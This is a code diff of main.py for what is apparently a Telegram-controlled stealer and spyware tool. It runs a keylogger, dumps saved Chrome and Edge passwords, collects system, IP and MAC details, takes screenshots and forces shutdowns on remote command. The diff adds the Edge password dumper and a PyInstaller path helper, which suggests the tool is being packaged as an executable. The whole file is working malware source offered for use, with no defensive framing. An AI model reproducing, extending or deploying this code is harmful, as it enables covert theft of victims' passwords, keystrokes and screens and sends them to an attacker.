@@ -1,12 +1,23 @@
 # main.py
 import os
+import sys
 import threading
 from pynput.keyboard import Listener
-from banner import create_banner, show
+import meli0das
 from telegram import check_telegram, send_telegram
 from get_info import SystemInfo, IPAddress, get_mac
-from dump import ChromePasswordDumper
+from edge import EdgePasswordDumper
+from chrome import ChromePasswordDumper
 from screenshot import send_screenshot
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
 
 def telegram_listener():
     last_update_id = -1
@@ -43,17 +54,20 @@ def telegram_listener():
                 config_info = system_info.display_info()
                 send_telegram(f'System Configuration: \n{config_info}')
 
-            elif command_lower == '/dump_password':
+            elif command_lower == '/chrome_password':
                 dumper = ChromePasswordDumper()
                 dumper.dump_passwords()
-
+            
+            elif command_lower == '/edge_password':
+                dumper = EdgePasswordDumper()
+                dumper.dump_passwords()
             elif command_lower == '/screenshot':
                 send_screenshot()
                 send_telegram('Screenshot taken and sent!')
 
             elif command_lower == '/shutdown':
                 send_telegram('Shutting down the system...')
-                os.system('shutdown /s /t 1')
+                os.system('shutdown /s /f /t 0')
 
 def on_press(key):
     try:
@@ -68,7 +82,7 @@ def keylogger_listener():
 
 if __name__ =='__main__':
     
-    asii_banner = show()
+    asii_banner = meli0das.show()
 
     dumper = ChromePasswordDumper()
     secret_key = dumper.get_secret_key()   
